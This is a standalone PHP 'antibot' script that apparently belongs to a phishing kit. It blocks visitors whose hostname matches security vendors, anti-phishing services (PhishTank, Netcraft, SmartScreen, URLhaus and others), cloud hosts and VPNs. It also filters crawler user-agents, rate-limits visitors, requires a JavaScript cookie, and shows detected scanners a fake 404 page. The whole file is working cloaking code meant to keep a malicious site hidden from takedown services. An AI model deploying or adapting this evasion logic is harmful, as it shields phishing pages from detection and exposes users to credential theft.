<?php

// Get the user's IP address
$ip = $_SERVER['REMOTE_ADDR'];

// Use a service to get the organization or ISP based on the IP address
$org = gethostbyaddr($ip); // This could also be replaced with a more reliable API for obtaining the ISP information

// Block specific ISPs
$blocked_isps = [
    'Computer Engineering',
    'DigitalOcean',
    'CHINANET',
    'BGPNET',
    'Think Huge',
    'Amazon',
    'Google',
    'QuickPacket',
    'Microsoft',
    'EGIHosting',
    'Yandex',
    'OVH',
    'SURF',
    'Cloudflare',
    'LINODE',
    'Cogent',
    'Hetzner',
    'Host Europe',
    'QuadraNet',
    'Leaseweb',
    'Psychz',
    'Contabo',
    'NetVirtue',
    'Choopa',
    'Wholesale Internet',
    'Vultr',
    'Hostinger',
    'Alexhost',
    'Vshield',
    'Sucuri',
    'Malwarebytes',
    'ESET',
    'Bitdefender',
    'Mcafee',
    'Zscaler',
    'Avast',
    'Sophos',
    'Symantec',
    'Webroot',
    'Cylance',
    'Trend Micro',
    'Kaspersky',
    'Fortinet',
    'Avira',
    'Palo Alto',
    'Checkpoint',
    'FireEye',
    'Proofpoint',
    'CrowdStrike',
    'F-Secure',
    'Carbon Black',
    'IBM Security',
    'Armor',
    'SentinelOne',
    'Alibaba Cloud',
    'UpCloud',
    'Scaleway',
    'BuyVM',
    'RamNode',
    'Endurance',
    'DreamHost',
    'SiteGround',
    'Namecheap',
    'InMotion',
    'A2 Hosting',
    'NordVPN',
    'ExpressVPN',
    'Private Internet Access',
    'CyberGhost',
    'HideMyAss',
    'Hotspot Shield',
    'TOR Exit Node',
    'Private Layer',
    'Total Server Solutions',
    'Cisco Systems',
    'Akamai Technologies',
    'Incapsula',
    'Barracuda Networks',
    'SonicWall',
    'Oracle Cloud',
    'Digital Energy Technologies',
    'Sharktech',
    'PhishTank',
    'Microsoft SmartScreen',
    'Netcraft Anti-Phishing',
    'Norton Safe Web',
    'McAfee SiteAdvisor',
    'Sophos Phish Threat',
    'AVG Threat Labs',
    'Bitdefender TrafficLight',
    'ESET Phishing Detector',
    'Fortinet Web Filter',
    'Palo Alto URL Filtering',
    'TrendMicro Web Reputation',
    'Comodo',
    'Trustwave',
    'Cyren',
    'Barracuda',
    'Check Point Threat Prevention',
    'F-Secure Browsing Protection',
    'Dr.Web Anti-phishing',
    'Spamhaus Domain Block List',
    'URLhaus Database',
    'Cofense Intelligence',
    'ZeroCERT Phishing Database',
    'zvelo Phishing Detection',
    'Abuse.ch',
    'CleanMX Phishing Database',
    'Malware Domain List',
    'Quttera Web Malware Scanner',
    'Krypt',
    'Unitas Global',
    'Pacnet',
    'GLOBALCONNECT',
    'GleSYS',
    'Datasource',
    'Zwiebelfreunde',
    'DataCorpore',
    'IMAFEX',
    'NNIT',
    'SERVERD',
    'Hangzhou',
];

foreach ($blocked_isps as $blockedIsp) {
    if (stripos(strtolower($org), strtolower($blockedIsp)) !== false) {
        $file = './stats.ini';
        $data = @parse_ini_file($file);
        $data['bots'] = $org;
        $data['Isp'] = $blockedIsp;
        file_put_contents(filename: $file, data: $data);
        die("COUNTRY NOT ALLOWED");
    }
}

// Bot detection logic
$isBota = false;

// Load the User Agent
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// AI-powered bot detection API key
$botDetectionApiKey = 'YOUR_API_KEY_HERE';

// 1. Basic User-Agent & Header Verification
$data = json_decode(file_get_contents('./crawler-user-agents.json'), true);
$patterns = [];

foreach ($data as $entry) {
    if ($entry['pattern'] == 'NoPattern' && isset($entry['instances'])) {
        foreach ($entry['instances'] as $instance) {
            $patterns[] = '/' . preg_quote($instance, '/') . '/';
        }
    }
}

// Check against patterns from crawler-user-agents.json
foreach ($patterns as $pattern) {
    if (preg_match($pattern, $userAgent)) {
        $isBota = true;
        break;
    }
}

// 2. Headers Analysis: Missing headers typical of browsers
if (!isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) || !isset($_SERVER['HTTP_USER_AGENT'])) {
    $isBota = true;
}

// 3. Bot Keyword Matching in User Agent
$botKeywords = [
    "bot",
    "crawler",
    "spider",
    "googlebot",
    "google",
    "bingbot",
    "yandexbot",
    "duckduckbot",
    "baiduspider",
    "slurp",
    "teoma",
    "sogou",
    "exabot",
    "facebot",
    "ia_archiver",
    "facebookexternalhit",
    "twitterbot",
    "discordbot",
    "AhrefsBot",
    "MJ12bot",
    "SemrushBot",
    "rogerbot",
    "DotBot",
    "Yeti",
    "Blekkobot",
    "adidxbot",
    "Dataprovider.com",
    "linkdexbot",
    "TurnitinBot",
    "archive.org_bot",
    "Gigabot",
    "voilabot",
    "Uptimebot",
    "Ezooms",
    "ltx71",
    "PaperLiBot",
    "Wotbox",
    "Nimbostratus-Bot",
    "ExaleadCloudview",
    "Qwantify",
    "Expanse",
    "MojeekBot",
    "CCBot",
    "Magpie-Crawler",
    "BLEXBot",
    "BUbiNG",
    "Cliqzbot",
    "coccoc",
    "rogerbot",
    "proximic",
    "CareerBot",
    "Nutch",
    "linkfluence",
    "Screaming Frog",
    "SiteExplorer",
    "BUbiNG",
    "YisouSpider",
    "meanpathbot",
    "InterfaxScanBot",
    "Barkrowler",
    "ZoominfoBot",
    "oBot",
    "cXensebot",
    "PiplBot",
    "archive.org_bot",
    "aiHitBot",
    "panscient.com",
    "SeznamBot",
    "HubSpot",
    "DeuSu",
    "SMTBot",
    "DeuSu",
    "Aboundex",
    "Cliqzbot",
    "aiHitBot",
    "TurnitinBot",
    "AddThis",
    "TweetmemeBot",
    "CareerBot",
    "DomainAppender",
    "Genieo",
    "Majestic12",
    "oBot",
    "PaperLiBot",
    "woriobot",
    "Xenu",
    "Xenu_Link_Sleuth",
    "ZumBot",
    "magpie-crawler",
    "rogerbot",
    "com Crawler",
    "ltx71",
    "okhttp",
    "R6_CommentReader",
    "R6_FeedFetcher",
    "R6_Spider",
    "scribdbot",
    "Zeus",
    "niki-bot",
    "SemrushBot",
    "bitlybot",
    "LinkpadBot",
    "blekkobot",
    "Qwantify",
    "Slackbot",
    "careerbot",
    "linkfluence",
    "Nimbostratus-Bot",
    "BUbiNG",
    "AdIdxBot",
    "barkrowler",
    "ccbot",
    "Cliqzbot",
    "DeuSu",
    "FyberSpider",
    "HubSpot",
    "IstellaBot",
    "linkdexbot",
    "Neevabot",
    "oBot",
    "Proximic",
    "QuerySeekerSpider",
    "rogerbot",
    "seznambot",
    "Twitterbot",
    "uMBot",
    "voilabot",
    "XoviBot",
    "BUbiNG",
    "careerbot",
    "Cliqzbot",
    "dotbot",
    "expanse",
    "infohelfer",
    "Instart",
    "integromedb",
    "Microsoft",
    "mj12bot",
    "Nimbostratus-Bot",
    "okhttp",
    "oBot",
    "prospectb2b",
    "SearchmetricsBot",
    "seznambot",
    "smtbot",
    "TurnitinBot",
    "voilabot",
    "ZoomBot",
    "ZoominfoBot",
    "ZumBot",
    "BUbiNG",
    "CareerBot",
    "Cliqzbot",
    "Infohelfer",
    "Integromedb",
    "integromedb",
    "Neevabot",
    "oBot",
    "prospectb2b",
    "R6_CommentReader",
    "R6_FeedFetcher",
    "R6_Spider",
    "Slackbot",
    "SMTBot",
    "Slackbot",
    "TurnitinBot",
    "voilabot",
    "woriobot",
    "XoviBot",
    "ZoomBot",
    "BUbiNG",
    "CareerBot",
    "Cliqzbot",
    "Infohelfer",
    "Integromedb",
    "Neevabot",
    "oBot",
    "prospectb2b",
    "R6_CommentReader",
    "R6_FeedFetcher",
    "R6_Spider",
    "Slackbot",
    "SMTBot",
    "Slackbot",
    "TurnitinBot",
    "voilabot",
    "woriobot",
    "XoviBot",
    "ZoomBot",
    "archive.org_bot",
    "Mediapartners-Google",
    "AdsBot-Google-Mobile",
    "AdsBot-Google",
    "FeedFetcher-Google",
    "bingbot",
    "msnbot-media",
    "msnbot",
    "Baiduspider",
    "YandexBot",
    "DuckDuckBot",
    "Sogou",
    "Exabot",
    "facebot",
    "ia_archiver",
    "facebookexternalhit",
    "Twitterbot",
    "discordbot",
    "firefoxbot",
];

foreach ($botKeywords as $keyword) {
    if (stripos($userAgent, $keyword) !== false || $userAgent == null) {
        $isBota = true;
        break;
    }
}

// 4. Hostname Check
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$blockedWords = [
    "amazonaws",
    "google",
    "softlayer",
    "tor-exit",
    "netcraft",
];

foreach ($blockedWords as $word) {
    if (stripos($hostname, $word) !== false) {
        $isBota = true;
        break;
    }
}

// 5. Rate Limiting: Monitor requests from the same IP
$visitTimestamp = time();
$visitLogFile = './visit_logs.json';
$visitLogs = json_decode(file_get_contents($visitLogFile), true);

if (!isset($visitLogs[$ip])) {
    $visitLogs[$ip] = [];
}
$visitLogs[$ip][] = $visitTimestamp;

$visitLogs[$ip] = array_filter($visitLogs[$ip], function ($timestamp) use ($visitTimestamp) {
    return ($visitTimestamp - $timestamp) <= 60;
});

if (count($visitLogs[$ip]) > 10) {
    $isBota = true;
}

file_put_contents(filename: $visitLogFile, data: json_encode($visitLogs));

// 6. AI-Powered Detection API (Optional)
// if (!$isBota) {
//     $botApiUrl = "https://bot-detection-api.com/check?apiKey=$botDetectionApiKey&ip=$ip&userAgent=" . urlencode($userAgent);
//     $botApiResponse = file_get_contents($botApiUrl);
//     $botApiResult = json_decode($botApiResponse, true);

//     if ($botApiResult['isBot'] === true) {
//         $isBota = true;
//     }
// }

// 7. Behavior Analysis (Simulated): Checking for JavaScript execution
if (!isset($_COOKIE['humanCheck'])) {
    echo "
    <script>
        document.cookie = 'humanCheck=1; path=/';
        location.reload();
    </script>";
    exit;
}

// Log and Block Bots
if ($isBota) {
    // update_ini($data, $file);

    http_response_code(404);
    echo "<!DOCTYPE html>
    <html lang='en'>
    
        <head>
            <meta charset='UTF-8'>
            <meta name='viewport' content='width=device-width, initial-scale=1.0'>
            <title>404 Not Found</title>
            <style>
                body { font-family: Arial, sans-serif; background-color: #f4f4f4; color: #333; }
                .container { text-align: center; background: #fff; padding: 50px; box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1); border-radius: 5px; }
                h1 { font-size: 5em; margin-bottom: 20px; color: #ff5252; }
                p { font-size: 1.5em; }
                a { margin-top: 20px; padding: 10px 20px; background-color: #ff5252; color: #fff; text-decoration: none; border-radius: 3px; }
            </style>
        </head>
        <body><br/>
    <br/>
    <br/>
            <div class='container'>
                <h1>404</h1>
                <p>Sorry, we just detect Bot and some suspicious reaction from your device.</p>
                <p>please off your vpn or your bot to continue enjoy our service</p>
                <p>Thanks</p>
                <a href='./'>Go Home</a>
            </div>
        </body>
    </html>";
    exit;
}
